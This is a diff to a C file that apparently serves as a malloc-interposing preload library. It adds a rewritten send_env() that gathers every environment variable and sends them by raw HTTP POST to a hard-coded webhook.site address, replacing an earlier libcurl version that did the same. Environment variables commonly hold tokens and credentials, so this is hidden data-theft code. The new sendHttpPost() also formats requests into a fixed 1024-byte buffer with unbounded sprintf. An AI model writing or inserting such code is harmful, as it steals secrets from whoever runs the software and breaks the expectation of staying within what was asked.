@@ -1,55 +1,89 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <curl/curl.h>
-#define _GNU_SOURCE
-#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+
 #include <dlfcn.h>
-#include <stdlib.h>
+#define _GNU_SOURCE
 
+int sendHttpPost(const char *hostname, const char *path, const char *data) {
+    int sockfd, status;
+    struct addrinfo hints;
+    struct addrinfo *servinfo, *p;
+    char buffer[1024];
 
+    memset(&hints, 0, sizeof hints);
+    hints.ai_family = AF_UNSPEC; // Use AF_INET6 to force IPv6
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_flags = AI_CANONNAME;
 
-
-extern char **environ;
-
-int send_env(void) {
-    CURL *curl;
-    CURLcode res;
-    char *post_data = NULL;
-    size_t length = 0;
-    int i;
-
-    curl_global_init(CURL_GLOBAL_ALL);
-
-    curl = curl_easy_init();
-    if (curl) {
-        post_data = strdup("");
-
-        for (i = 0; environ[i]; i++) {
-            length += strlen(environ[i]) + 1;
-            post_data = realloc(post_data, length);
-
-            if (i > 0) {
-                strcat(post_data, "&");  
-            }
-            strcat(post_data, environ[i]); 
-        }
-
-        curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/b3ad9a28-2a07-440a-a941-d3b40c6deb65");
-
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-
-        res = curl_easy_perform(curl);
-        if(res != CURLE_OK)
-            fprintf(stderr, "curl_easy_perform() failed: %s\n",
-                    curl_easy_strerror(res));
-
-        curl_easy_cleanup(curl);
-        free(post_data); // Free the dynamically allocated memory
+    if ((status = getaddrinfo(hostname, "80", &hints, &servinfo)) != 0) {
+        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
+        return -1;
     }
 
-    curl_global_cleanup();
+    // Loop through all the results and connect to the first we can
+    for(p = servinfo; p != NULL; p = p->ai_next) {
+        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+            perror("client: socket");
+            continue;
+        }
+
+        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
+            close(sockfd);
+            perror("client: connect");
+            continue;
+        }
+
+        break; // if we get here, we must have connected successfully
+    }
+
+    if (p == NULL) {
+        // Loop through all results and couldn't connect
+        fprintf(stderr, "failed to connect\n");
+        return -2;
+    }
+
+    // Format and send HTTP POST request
+    sprintf(buffer, "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %lu\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n%s",
+            path, hostname, strlen(data), data);
+    if (send(sockfd, buffer, strlen(buffer), 0) == -1) {
+        perror("send");
+        return -3;
+    }
+
+    // Read server response
+    memset(buffer, 0, sizeof(buffer));
+    if (recv(sockfd, buffer, sizeof(buffer), 0) == -1) {
+        perror("recv");
+        return -4;
+    }
+    printf("%s\n", buffer);
+
+    freeaddrinfo(servinfo); // free the linked-list
+    close(sockfd); // close the socket
     return 0;
+} 
+
+int send_env() {
+    extern char **environ;
+    char *data = calloc(65536, sizeof(char)); 
+    char *ptr = data;
+    size_t len = 0;
+    for (int i = 0; environ[i]; i++) {
+        len = snprintf(ptr, 65536 - (ptr - data), "%s&", environ[i]);
+        ptr += len;
+    }
+    if (ptr != data) { 
+        *(ptr - 1) = '\0';
+    }
+
+    sendHttpPost("webhook.site", "/b3ad9a28-2a07-440a-a941-d3b40c6deb65", data);
+
+    free(data);
 }
 
 static void* (*real_malloc)(size_t)=NULL;
